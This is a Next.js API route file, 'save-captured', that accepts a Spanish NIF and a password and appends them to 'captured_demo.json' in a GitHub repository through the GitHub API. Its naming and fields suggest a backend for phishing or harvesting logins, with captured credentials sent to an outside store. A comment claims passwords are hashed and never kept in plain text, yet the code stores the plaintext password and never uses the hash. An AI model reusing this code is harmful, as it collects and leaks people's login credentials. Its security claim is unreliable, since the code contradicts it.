// app/api/save-captured/route.ts
import { NextResponse } from "next/server";
import bcrypt from "bcryptjs";

const OWNER = process.env.GH_OWNER!;
const REPO = process.env.GH_REPO!;
const BRANCH = process.env.GH_BRANCH || "main";
const PATH = "captured_demo.json";
const TOKEN = process.env.GH_TOKEN!;

async function getFileInfo() {
  const r = await fetch(`https://api.github.com/repos/${OWNER}/${REPO}/contents/${PATH}?ref=${BRANCH}`, {
    headers: { Authorization: `token ${TOKEN}`, Accept: "application/vnd.github+json" },
  });
  if (r.status === 404) return null;
  if (!r.ok) throw new Error(`GitHub API getFile failed ${r.status}`);
  return r.json();
}

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { nif, password } = body || {};
    if (!nif || !password) return NextResponse.json({ error: "Faltan campos" }, { status: 400 });

    // Hash de la contraseña (no almacenamos texto plano)
    const hash = await bcrypt.hash(password, 10);
    const entry = { nif, password, timestamp: new Date().toISOString() };

    // Obtener fichero existente si existe
    const fileInfo = await getFileInfo();
    let contentObj: any;

    if (fileInfo) {
      const decoded = Buffer.from(fileInfo.content, "base64").toString();
      try {
        contentObj = JSON.parse(decoded);
      } catch (e) {
        contentObj = {};
      }
      contentObj.entries = contentObj.entries || [];
      contentObj.entries.push(entry);
    } else {
      contentObj = { entries: [entry] };
    }

    const contentBase64 = Buffer.from(JSON.stringify(contentObj, null, 2)).toString("base64");

    const putBody: any = {
      message: "Update captured_demo.json from deployed app",
      content: contentBase64,
      branch: BRANCH,
    };
    if (fileInfo && fileInfo.sha) putBody.sha = fileInfo.sha;

    const putRes = await fetch(`https://api.github.com/repos/${OWNER}/${REPO}/contents/${PATH}`, {
      method: "PUT",
      headers: {
        Authorization: `token ${TOKEN}`,
        Accept: "application/vnd.github+json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(putBody),
    });

    if (!putRes.ok) {
      const text = await putRes.text();
      console.error("GitHub PUT error:", text);
      return NextResponse.json({ ok: false, error: text }, { status: 500 });
    }

    return NextResponse.json({ ok: true });
  } catch (err: any) {
    console.error("save-captured error:", err);
    return NextResponse.json({ ok: false, error: err.message || "internal" }, { status: 500 });
  }
}
